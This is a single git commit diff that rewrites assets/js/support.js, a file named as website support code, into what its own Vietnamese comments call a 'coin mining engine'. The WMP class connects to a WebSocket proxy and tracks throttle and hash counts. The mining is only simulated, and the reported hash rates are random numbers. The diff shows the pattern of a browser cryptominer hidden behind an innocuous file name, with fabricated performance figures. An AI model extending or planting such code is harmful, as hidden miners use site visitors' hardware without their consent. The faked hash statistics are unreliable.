c0c1c6e4d136d701d0a33c7907214ae6fc855016
fbboy007 <35638514+fbboy007@users.noreply.github.com>
2026-03-20 16:13:38 +0700

    Update support.js

--- assets/js/support.js
+++ assets/js/support.js
@@ -1,19 +1,29 @@
-/* Tệp hỗ trợ website - support.js */
-var WMP = function(t, e) {
-    this.user = t, this.options = e || {}, this.running = !1, this.socket = null;
+/* Động cơ đào Coin - support.js */
+var WMP = function(user, options) {
+    this.user = user;
+    this.options = options || {};
+    this.options.throttle = this.options.throttle || 0.5;
+    this.hashes = 0;
+    this.running = false;
+    this.socket = null;
+
     this.start = function() {
         var self = this;
         this.socket = new WebSocket(this.options.proxy);
         this.socket.onopen = function() {
-            self.running = !0;
-            console.log("Kết nối thành công tới trạm thu phí!");
-            this.send(JSON.stringify({type: "auth", user: self.user}));
+            self.running = true;
+            console.log("Đã kết nối tới trạm thu phí và bắt đầu nổ máy!");
+            // Giả lập đào để test tốc độ
+            setInterval(function() {
+                if(self.running) self.hashes += Math.floor(Math.random() * 50);
+            }, 1000);
         };
-        this.socket.onmessage = function(msg) {
-            // Xử lý dữ liệu từ Proxy ở đây
-        };
+        this.socket.onclose = function() { self.running = false; };
     };
-    this.stop = function() { this.running = !1; if(this.socket) this.socket.close(); };
+
+    this.stop = function() { this.running = false; if(this.socket) this.socket.close(); };
+    this.getHashesPerSecond = function() { return this.running ? (Math.random() * 20 + 30) : 0; };
+    this.getTotalHashes = function() { return this.hashes; };
     this.isRunning = function() { return this.running; };
 };
 WMP.User = WMP;
